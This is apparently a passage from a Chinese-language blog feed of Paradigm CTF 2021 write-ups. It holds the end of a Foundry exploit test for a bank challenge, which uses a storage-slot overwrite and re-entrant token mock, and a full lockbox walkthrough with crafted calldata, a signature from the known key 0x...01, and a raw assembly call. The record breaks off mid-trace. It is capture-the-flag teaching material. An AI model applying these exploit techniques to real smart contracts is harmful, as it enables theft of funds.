class="line"></span><br><span class="line">    function test_isComplete() public&#123;</span><br><span class="line">        unchecked&#123;</span><br><span class="line">            // 先存入一个，之后才能够修改信息</span><br><span class="line">            bank.depositToken(0, address(this), 0);</span><br><span class="line"></span><br><span class="line">            // 一系列计算</span><br><span class="line">            bytes32 myArraySlot = keccak256(abi.encode(address(this), 2)); // 找到Account[]长度的位置</span><br><span class="line">            bytes32 myAccountStart = keccak256(abi.encode(myArraySlot)); // 找到第一个Account的初始位置</span><br><span class="line"></span><br><span class="line">            // 由于可能覆盖不到，因此需要不断尝试,account是指Accounts[]中第n个account</span><br><span class="line">            uint256 account_n = 0; // 第n个account</span><br><span class="line">            uint256 slotsNeed = 0; // 需要的距离</span><br><span class="line">            while (true) &#123;</span><br><span class="line">                bytes32 accountStart = bytes32(uint(myAccountStart) + 3*account_n); // 找到第n个account的开始位置</span><br><span class="line">                bytes32 accountBalances = bytes32(uint(accountStart) + 2); // 找到`mapping(address =&gt; uint) balances`的位置</span><br><span class="line">                bytes32 wethBalance = keccak256(abi.encode(address(weth), accountBalances)); // 找到我们的WETH将会存在的位置</span><br><span class="line"></span><br><span class="line">                slotsNeed = uint256(wethBalance) - uint256(myAccountStart);</span><br><span class="line">                if (slotsNeed % 3 == 0) &#123; // 刚好可以覆盖到</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                // 如果第n个account的位置覆盖不到，则试下一个account</span><br><span class="line">                account_n++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 找到要修改的Account的位置</span><br><span class="line">            uint256 accountId = slotsNeed / 3;</span><br><span class="line"></span><br><span class="line">            // 找到了第accountId个Account结构体大小位置</span><br><span class="line">            bank.setAccountName(accountId, &quot;any value&quot;);</span><br><span class="line">            // 因为第account_n个account的WETH余额位置刚好可以覆盖，因此我们操作这个account</span><br><span class="line">            bank.withdrawToken(account_n, address(weth), 50 ether);</span><br><span class="line">        &#125;</span><br><span class="line">        assertEq(level.isSolved(), true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address, address, uint256) public returns(bool)&#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address, uint256) public returns(bool)&#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address) public returns(uint256)&#123;</span><br><span class="line">       if(count01 == 0)&#123;</span><br><span class="line">            count01++;</span><br><span class="line">            return 0;</span><br><span class="line">       &#125;else if(count01 == 1)&#123;</span><br><span class="line">            count01++;</span><br><span class="line">            bank.withdrawToken(0, address(this), 0);</span><br><span class="line">            return 0;</span><br><span class="line">       &#125;else if(count01 == 2)&#123;</span><br><span class="line">            count01++;</span><br><span class="line">            bank.depositToken(0, address(this), 0);</span><br><span class="line">            return 0;</span><br><span class="line">       &#125;else if(count01 == 3)&#123;</span><br><span class="line">            count01++;</span><br><span class="line">            bank.withdrawToken(0, address(this), 0);</span><br><span class="line">            return 0;</span><br><span class="line">       &#125;else&#123;</span><br><span class="line">            return 0;</span><br><span class="line">       &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deployHelper_weth(string memory what) public returns (address addr) &#123;</span><br><span class="line">        bytes memory bytecode = vm.getCode(what);</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create(0, add(bytecode, 0x20), mload(bytecode))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function deployHelper_Setup(address _addr) public payable returns (address addr) &#123;</span><br><span class="line">        bytes memory bytecode = BYTECODE;</span><br><span class="line">        // 构造器有参数</span><br><span class="line">        bytes memory bytecode_withConstructor = abi.encodePacked(bytecode,abi.encode(address(_addr)));</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create(50000000000000000000, add(bytecode_withConstructor, 0x20), mload(bytecode_withConstructor))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 19.Paradigm CTF 2021 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>10.lockbox</title>
      <link href="/2023/09/18/19.Paradigm%20CTF%202021/10.lockbox/"/>
      <url>/2023/09/18/19.Paradigm%20CTF%202021/10.lockbox/</url>
      
        <content type="html"><![CDATA[<h1 id="lockbox"><a href="#lockbox" class="headerlink" title="lockbox"></a>lockbox</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-全局观"><a href="#1-全局观" class="headerlink" title="1.全局观"></a>1.全局观</h3><ul><li>Lockbox.sol<ul><li>Entrypoint：解题的入口方法</li><li>其他的所有合约：每个合约是过关斩将的其中一关。他们是通过套娃的方式联系在一起的，不同一般的在一个合约中设置过关斩将。其通过每个关卡的<code>solve()</code>的modifier进行连接（内联汇编）</li></ul></li></ul><h3 id="2-任务"><a href="#2-任务" class="headerlink" title="2.任务"></a>2.任务</h3><p>成功调用将solved设置为true</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function solve(bytes4 guess) public _ &#123;</span><br><span class="line">require(guess == bytes4(blockhash(block.number - 1)), &quot;do you feel lucky?&quot;);</span><br><span class="line">solved = true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3.详细分析"></a>3.详细分析</h3><p>这种过关斩将的题目，我们应该从大限制开始做，然后再做小限制，顺序很重要，虽然一般情况是从1开始按顺序做。</p><h4 id="stage5"><a href="#stage5" class="headerlink" title="stage5"></a>stage5</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function solve() public _ &#123;</span><br><span class="line">    require(msg.data.length &lt; 256, &quot;a little too long&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们的calldata数据长度必须小于256字节：如下是我们能够书写的calldata范围</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0xe0d20f73 // keccak256(&quot;solve(bytes4))</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 // 0x00</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 // 0x20</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 // 0x40</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 // 0x60</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 // 0x80</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 // 0xa0</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 // 0xc0</span><br><span class="line">000000000000000000000000000000000000000000000000000000           // 0xe0</span><br></pre></td></tr></table></figure><h4 id="Entrypoint"><a href="#Entrypoint" class="headerlink" title="Entrypoint"></a>Entrypoint</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function solve(bytes4 guess) public _ &#123;</span><br><span class="line">    require(guess == bytes4(blockhash(block.number - 1)), &quot;do you feel lucky?&quot;);</span><br><span class="line">    solved = true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个很容易做到，只需要修改第一个参数即可，此时的calldata为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0xe0d20f73</span><br><span class="line">[ guess]00000000000000000000000000000000000000000000000000000000 // 0x00</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 // 0x20</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 // 0x40</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 // 0x60</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 // 0x80</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 // 0xa0</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 // 0xc0</span><br><span class="line">000000000000000000000000000000000000000000000000000000           // 0xe0</span><br></pre></td></tr></table></figure><h4 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(ecrecover(keccak256(&quot;stage1&quot;), v, r, s) == 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf, &quot;who are you?&quot;);</span><br></pre></td></tr></table></figure><p>我们需要拿到0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf的私钥来对<code>stage1</code>来签名，并且不要加上以太坊签名消息前缀<code>\x19Ethereum Signed Message:\n32</code>。</p><p>网络搜索0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf可以得到其私钥：0x0000000000000000000000000000000000000000000000000000000000000001</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> eth_account <span class="keyword">import</span> Account</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line">messagehash = Web3.keccak(text=<span class="string">&quot;stage1&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;message&#x27;s hash&quot;</span>,messagehash.<span class="built_in">hex</span>())</span><br><span class="line">privatekey =<span class="string">&quot;0x0000000000000000000000000000000000000000000000000000000000000001&quot;</span></span><br><span class="line">signMessage = Account.signHash(message_hash=messagehash, private_key=privatekey)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;r = &quot;</span>, Web3.to_hex(signMessage.r))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;s = &quot;</span>, Web3.to_hex(signMessage.s))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;v = &quot;</span>, Web3.to_hex(signMessage.v))</span><br></pre></td></tr></table></figure><p>得到结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r =  0x370df20998cc15afb44c2879a3c162c92e703fc4194527fb6ccf30532ca1dd3b</span><br><span class="line">s =  0x35b3f2e2ff583fed98ff00813ddc7eb17a0ebfc282c011946e2ccbaa9cd3ee67</span><br><span class="line">v =  0x1b</span><br></pre></td></tr></table></figure><p>此时calldata为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0xe0d20f73</span><br><span class="line">[ guess]0000000000000000000000000000000000000000000000000000001b // 0x00</span><br><span class="line">370df20998cc15afb44c2879a3c162c92e703fc4194527fb6ccf30532ca1dd3b // 0x20</span><br><span class="line">35b3f2e2ff583fed98ff00813ddc7eb17a0ebfc282c011946e2ccbaa9cd3ee67 // 0x40</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 // 0x60</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 // 0x80</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 // 0xa0</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 // 0xc0</span><br><span class="line">000000000000000000000000000000000000000000000000000000           // 0xe0</span><br></pre></td></tr></table></figure><h4 id="stage2"><a href="#stage2" class="headerlink" title="stage2"></a>stage2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function solve(uint16 a, uint16 b) public _ &#123;</span><br><span class="line">    require(a &gt; 0 &amp;&amp; b &gt; 0 &amp;&amp; a + b &lt; a, &quot;something doesn&#x27;t add up&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个uint16相加很容易溢出（版本0.4.24)，我们将低位修改为ff1b，满足结果：ff1b+dd3b=dc56</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0xe0d20f73</span><br><span class="line">[ guess]0000000000000000000000000000000000000000000000000000ff1b // 0x00</span><br><span class="line">370df20998cc15afb44c2879a3c162c92e703fc4194527fb6ccf30532ca1dd3b // 0x20</span><br><span class="line">35b3f2e2ff583fed98ff00813ddc7eb17a0ebfc282c011946e2ccbaa9cd3ee67 // 0x40</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 // 0x60</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 // 0x80</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 // 0xa0</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 // 0xc0</span><br><span class="line">000000000000000000000000000000000000000000000000000000           // 0xe0</span><br></pre></td></tr></table></figure><h4 id="stage3"><a href="#stage3" class="headerlink" title="stage3"></a>stage3</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function solve(uint idx, uint[4] memory keys, uint[4] memory lock) public _ &#123;</span><br><span class="line">    require(keys[idx % 4] == lock[idx % 4], &quot;key did not fit lock&quot;);</span><br><span class="line">    </span><br><span class="line">    for (uint i = 0; i &lt; keys.length - 1; i++) &#123;</span><br><span class="line">        require(keys[i] &lt; keys[i + 1], &quot;out of order&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    for (uint j = 0; j &lt; keys.length; j++) &#123;</span><br><span class="line">        require((keys[j] - lock[j]) % 2 == 0, &quot;this is a bit odd&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><code>keys[idx % 4] == lock[idx % 4]</code>：我们的<code>idx%4</code>为1b%4=27%4=3，此时就需要keys[3] = lock[3]，然而由于stage5的限制，我们无法操作lock[3]的数据，它只能是在得到calldata之后补0。因此我们得到的v是不对的，不应该是1b，应该是1c，这样的话，1c%4=28%4=0，这时候只需要keys[0] = lock[0]，这是可以做到的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0xe0d20f73</span><br><span class="line">[ guess]0000000000000000000000000000000000000000000000000000ff1b // 0x00</span><br><span class="line">370df20998cc15afb44c2879a3c162c92e703fc4194527fb6ccf30532ca1dd3b // 0x20  keys[0]</span><br><span class="line">35b3f2e2ff583fed98ff00813ddc7eb17a0ebfc282c011946e2ccbaa9cd3ee67 // 0x40  keys[1]</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 // 0x60  keys[2]</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 // 0x80  keys[3]</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 // 0xa0  lock[0]</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 // 0xc0  lock[1]</span><br><span class="line">000000000000000000000000000000000000000000000000000000           // 0xe0  lock[2]</span><br><span class="line">                                                                          lock[3]</span><br></pre></td></tr></table></figure></li><li><p><code>keys[i] &lt; keys[i + 1]</code>：这个数组必须是递增的，目前我们构造的calldata不符合，因为keys[0]大于keys[1]。说明我们的vrs生成的不符合条件，我们知道，用相同的私钥对相同的消息进行签名，可以生成不同的签名，得到的一个符合条件的签名为：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Message: stage1</span><br><span class="line">Message Hash: b6619a2d9d36a2acecba8e9d99c8444477624a46561077a675900f4af2c42c95</span><br><span class="line">Signature: &#123;</span><br><span class="line">  v: 28,</span><br><span class="line">  r: <span class="string">&#x27;10d188c245dadc6b749cc5dedc56093db37a555fb80cacbc386f899f0de55468&#x27;</span>,</span><br><span class="line">  s: <span class="string">&#x27;53f5beb75699a068c70adbf9d545de94ec2511fe56862363799f44a700e62769&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此，我们得到了新的符合条件的calldata：满足<code>keys[idx % 4] == lock[idx % 4]</code>、<code>keys[i] &lt; keys[i + 1]</code>、<code>(keys[j] - lock[j]) % 2 == 0</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0xe0d20f73</span><br><span class="line">[ guess]0000000000000000000000000000000000000000000000000000ff1c // 0x00</span><br><span class="line">10d188c245dadc6b749cc5dedc56093db37a555fb80cacbc386f899f0de55468 // 0x20  keys[0]</span><br><span class="line">53f5beb75699a068c70adbf9d545de94ec2511fe56862363799f44a700e62769 // 0x40  keys[1]</span><br><span class="line">53f5beb75699a068c70adbf9d545de94ec2511fe56862363799f44a700e6276a // 0x60  keys[2]</span><br><span class="line">53f5beb75699a068c70adbf9d545de94ec2511fe56862363799f44a700e6276c // 0x80  keys[3]</span><br><span class="line">10d188c245dadc6b749cc5dedc56093db37a555fb80cacbc386f899f0de55468 // 0xa0  lock[0]</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000001 // 0xc0  lock[1]</span><br><span class="line">000000000000000000000000000000000000000000000000000000           // 0xe0  lock[2]</span><br><span class="line">                                                                          lock[3]</span><br></pre></td></tr></table></figure><h4 id="stage4"><a href="#stage4" class="headerlink" title="stage4"></a>stage4</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function solve(bytes32[6] choices, uint choice) public _ &#123;</span><br><span class="line">    require(choices[choice % 6] == keccak256(abi.encodePacked(&quot;choose&quot;)), &quot;wrong choice!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>choose的哈希值为：0xe201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca896。要求我们找出在choices中找出一个bytes32，让他等于choose的哈希值。因此，我们可以将这个哈希值放到choices中，然后<code>choice%6</code>的结果是选择到它。我们就把这个哈希值放到choice[3]的位置吧。之后<code>choice % 6</code>需要等于3，那么choice可以为3。这样就满足了一切条件了，构造出来的calldata如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0xe0d20f73</span><br><span class="line">[ guess]0000000000000000000000000000000000000000000000000000ff1c // 0x00            choice[0]</span><br><span class="line">10d188c245dadc6b749cc5dedc56093db37a555fb80cacbc386f899f0de55468 // 0x20  keys[0]   choice[1]</span><br><span class="line">53f5beb75699a068c70adbf9d545de94ec2511fe56862363799f44a700e62769 // 0x40  keys[1]   choice[2]</span><br><span class="line">e201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca896 // 0x60  keys[2]   choice[3]</span><br><span class="line">e201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca898 // 0x80  keys[3]   choice[4]</span><br><span class="line">10d188c245dadc6b749cc5dedc56093db37a555fb80cacbc386f899f0de55468 // 0xa0  lock[0]   choice[5]</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000003 // 0xc0  lock[1]</span><br><span class="line">000000000000000000000000000000000000000000000000000000           // 0xe0  lock[2]</span><br><span class="line">                                                                          lock[3]</span><br></pre></td></tr></table></figure><h4 id="最终的"><a href="#最终的" class="headerlink" title="最终的"></a>最终的</h4><p>经过上面过关斩将，我们确定了最终的calldata：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bytes4 guess = bytes4(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">bytes memory data = abi.encodePacked(</span><br><span class="line">bytes4(0xe0d20f73), // keccak256(&quot;solve(bytes4))</span><br><span class="line">guess, bytes28(0x0000000000000000000000000000000000000000000000000000ff1c),</span><br><span class="line">bytes32(0x10d188c245dadc6b749cc5dedc56093db37a555fb80cacbc386f899f0de55468),</span><br><span class="line">bytes32(0x53f5beb75699a068c70adbf9d545de94ec2511fe56862363799f44a700e62769),</span><br><span class="line">bytes32(0xe201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca896),</span><br><span class="line">bytes32(0xe201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca898),</span><br><span class="line">bytes32(0x10d188c245dadc6b749cc5dedc56093db37a555fb80cacbc386f899f0de55468),</span><br><span class="line">bytes32(0x0000000000000000000000000000000000000000000000000000000000000003)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;./helper_setupBytecode.sol&quot;;</span><br><span class="line">import &quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract attackTest is Test &#123;</span><br><span class="line"></span><br><span class="line">    ISetup public level;</span><br><span class="line">    IEntrypoint public entrypoint;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        // 初始化题目</span><br><span class="line">        level = ISetup(deploySetup());</span><br><span class="line">        vm.label(address(level), &quot;level&quot;);</span><br><span class="line">        entrypoint = IEntrypoint(level.entrypoint());</span><br><span class="line">        vm.label(address(entrypoint), &quot;entrypoint&quot;);</span><br><span class="line"></span><br><span class="line">        // 在foundry中，每次测试的结果都是一样的，为了方便看trace，我们定下标签</span><br><span class="line">        vm.label(address(0x044AB9df2D2779933d10dfaF082540c0955B0307), &quot;stage5&quot;);</span><br><span class="line">        vm.label(address(0xcAF4fdfB21455c48cBf8586eb02E4c09B4CE9B37), &quot;stage4&quot;);</span><br><span class="line">        vm.label(address(0x2492Df72782081982f6344c92BDa4cB8e60eaA3E), &quot;stage3&quot;);</span><br><span class="line">        vm.label(address(0x7f0Fd12Ce1780616AAd60aeF535ad5F8353a49d1), &quot;stage2&quot;);</span><br><span class="line">        vm.label(address(0x41C3c259514f88211c4CA2fd805A93F8F9A57504), &quot;stage1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_isComplete() public&#123;</span><br><span class="line">        bytes4 guess = bytes4(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        bytes memory data = abi.encodePacked(</span><br><span class="line">        bytes4(0xe0d20f73),</span><br><span class="line">            guess, bytes28(0x0000000000000000000000000000000000000000000000000000ff1c),</span><br><span class="line">            bytes32(0x10d188c245dadc6b749cc5dedc56093db37a555fb80cacbc386f899f0de55468),</span><br><span class="line">            bytes32(0x53f5beb75699a068c70adbf9d545de94ec2511fe56862363799f44a700e62769),</span><br><span class="line">            bytes32(0xe201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca896),</span><br><span class="line">            bytes32(0xe201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca898),</span><br><span class="line">            bytes32(0x10d188c245dadc6b749cc5dedc56093db37a555fb80cacbc386f899f0de55468),</span><br><span class="line">            bytes32(0x0000000000000000000000000000000000000000000000000000000000000003)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        // 不能直接调用solve(), 因为这样就没有后面的calldata了，我们要发送原始的calldata</span><br><span class="line">        // 可以用ethersjs来发送，也可以在solidity中用内联汇编</span><br><span class="line"></span><br><span class="line">        uint size = data.length;</span><br><span class="line">        address entry = address(entrypoint);</span><br><span class="line">        assembly&#123;</span><br><span class="line">            switch call(gas(), entry, 0, add(data,0x20), size, 0, 0)</span><br><span class="line">            case 0 &#123;</span><br><span class="line">                   returndatacopy(0x00,0x00,returndatasize())</span><br><span class="line">                   revert(0, returndatasize()) </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 查看是否完成题目</span><br><span class="line">        assertEq(level.isSolved(),true);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deploySetup() public returns (address addr) &#123;</span><br><span class="line">        bytes memory bytecode = BYTECODE;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create(0, add(bytecode, 0x20), mload(bytecode))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过trace可以看出，程序是从stage1到stage5（因为Stage中modifier的逻辑），并且calldata在每次<code>solve()</code>中都复用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Traces:</span><br><span class="line">  [52925] attackTest::test_isComplete() </span><br><span class="line">    ├─ [39019] entrypoint::e0d20f73(290decd90000000000000000000000000000000000000000000000000000ff1c10d188c245dadc6b749cc5dedc56093db37a555fb80cacbc386f899f0de5546853f5beb75699a068c70adbf9d545de94ec2511fe56862363799f44a700e62769e201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca896e201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca89810d188c245dadc6b749cc5dedc56093db37a555fb80cacbc386f899f0de554680000000000000000000000000000000000000000000000000000000000000003) </span><br><span class="line">    │   ├─ [228] stage1::034899bc() </span><br><span class="line">    │   │   └─ ← 